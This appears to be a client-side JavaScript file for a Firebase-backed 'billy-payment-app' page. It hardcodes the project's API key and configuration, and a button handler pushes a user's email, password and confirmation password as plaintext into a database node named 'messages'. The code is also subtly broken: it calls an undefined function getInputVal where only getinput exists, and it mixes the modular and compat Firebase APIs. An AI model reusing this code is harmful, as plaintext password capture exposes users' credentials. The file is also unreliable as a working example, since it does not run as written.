// Import the functions you need from the SDKs you need
import { initializeApp } from "firebase/app";
// TODO: Add SDKs for Firebase products that you want to use
// https://firebase.google.com/docs/web/setup#available-libraries

// Your web app's Firebase configuration*/
const firebaseConfig = {
  
  apiKey: "AIzaSyA588GyaRwUeolD6zmxbjvS8EU7Lq-EF_s",
  authDomain: "billy-payment-app.firebaseapp.com",
  projectId: "billy-payment-app",
  storageBucket: "billy-payment-app.appspot.com",
  messagingSenderId: "716948441529",
  appId: "1:716948441529:web:d7d954ed60d569ddcf0e68"
};

// Initialize Firebase
//const app = initializeApp(firebaseConfig);
firebase.initializeApp(firebaseConfig);
const auth=firebase.auth();

var messageRef=firebase.database().ref('messages');

document.getElementById('newpass').addEventListener('click', submitform);

function submitform(e){
    e.preventDefault();

let nemail=getInputVal('email');
let npassword=getInputVal('password');
let ncpassword=getInputVal('confirmpassword');
saveMessage(nemail, npassword, ncpassword);
}

function getinput(id){
    return document.getElementById(id).value;
}

function saveMessage(nemail, npassword, ncpassword){
    var newmessageref=messageRef.push();
    newmessageref.set({
        nemail: nemail, 
        npassword: npassword, 
        ncpassword: ncpassword
    });
}
